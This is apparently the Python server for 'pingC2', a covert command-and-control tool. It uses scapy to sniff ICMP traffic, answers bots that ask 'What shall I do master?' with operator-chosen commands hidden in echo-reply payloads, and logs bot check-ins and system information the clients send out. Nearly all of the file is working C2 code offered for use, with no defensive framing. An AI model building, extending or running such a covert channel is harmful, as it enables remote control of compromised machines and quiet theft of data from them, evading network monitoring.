#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

from multiprocessing import *
import threading
import ctypes
import sys
import signal
from scapy.all import *

def displayMenu():
	print ""
	print "Choose an option"
        if not active_children():
		print "1) Start C2 listener"
        print "2) Show bots"
        print "3) Change bot command"
        print "q) Quit"

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'
	sys.exit()

# Command and Control main function
def c2main(command):
	print ""
        print "[*] Command received from C2: %s" % command
	while True:
		logfile_error = open('errors.log','w')
		conf.verb = 0
        	count = 1
        	filter = "icmp"
		packet = sniff(count,filter=filter)
		for p in packet:
        		#p.show2()
                	try:
                		request = p['Raw'].load
                        	ip_id = p['IP'].id
                       		icmp_id = p['ICMP'].id
                       		#print "[*] Request: " + request
				if request == 'What shall I do master?':
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command)
                                	print "[*] Response sent to %s: %s" % (p['IP'].src,command)
                                	#resp.show2()
                                	send(resp)
					displayMenu()
					print "Option: "
                        	elif request == 'Checkin':
					print "[*] %s checking in" % p['IP'].src
				elif 'sysinfo' in request:
                        		sysinfo = request[8:]
                                	print "[*] Received sysinfo from client: %s" % sysinfo
                                	resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                	#resp.show2()
                                	print "[*] Response sent: Thanks"
                                	send(resp)
					displayMenu()      
                        		print "Option: "
				else:   
                                        print "[**] Client not recognized"
					displayMenu()
                	except:
				error = "[X] ERROR: " + str(sys.exc_info()[0])
                        	logfile_error.write(error)

def main(argv):
	print "	 _____    _                    _____   ___  "
 	print "	|  __ \  (_)                  / ____| |__ \ "
 	print "	| |__) |  _   _ __     __ _  | |         ) |"
 	print "	|  ___/  | | | '_ \   / _` | | |        / / "
 	print "	| |      | | | | | | | (_| | | |____   / /_ "
 	print "	|_|      |_| |_| |_|  \__, |  \_____| |____|"
        print "        		        _/ |                "
        print "			     |___/		    "
        print "						    "
	print "			Command Center              "
	print "			   by NoCow		    "
	while True:
		signal.signal(signal.SIGINT, handler)
		displayMenu()
		option = raw_input("Option: ")
		if option == '1':
			command = 'sysinfo'
			if active_children():
				print "[*] Capture running. Stopping first."
				for proc in active_children():		
					proc.terminate()
				print "[*] Starting new capture"
				process = Process(target=c2main, args=([command]))
				process.start()
				if process.is_alive():
					print "[*] C2 Listening - command: %s" % command
				else:
					print "[X] Error starting C2 listener"
			else:
				print "[*] No capture currently running. Starting..."
				process = Process(target=c2main, args=([command]))
				process.start()
				if process.is_alive():
					print "[*] C2 Listening - command: %s" % command
				else:
					print "[X] Error starting C2 listener"
		elif option == '2':
			print "Displaying bots"
		elif option == '3':
			command = raw_input("Enter a command: ")
                        if active_children():
                                print "[*] Capture running. Stopping first."
                                for proc in active_children():
                                        proc.terminate()
                                print "[*] Starting new capture"
                                process = Process(target=c2main, args=([command]))
                                process.start()
                                if process.is_alive():
                                        print "[*] C2 Listening - command: %s" % command
                                else:
                                        print "[X] Error starting C2 listener"
                        else:
                                print "[*] No capture currently running. Starting..."
                                process = Process(target=c2main, args=([command]))
                                process.start()
                                if process.is_alive():
                                        print "[*] C2 Listening - command: %s" % command
                                else:
                                        print "[X] Error starting C2 listener"
		elif option == 'q':
			for proc in active_children():
				proc.terminate()
			sys.exit()
		else:
			print "Invalid Option...please try again"

if __name__ == "__main__":
   main(sys.argv[1:])
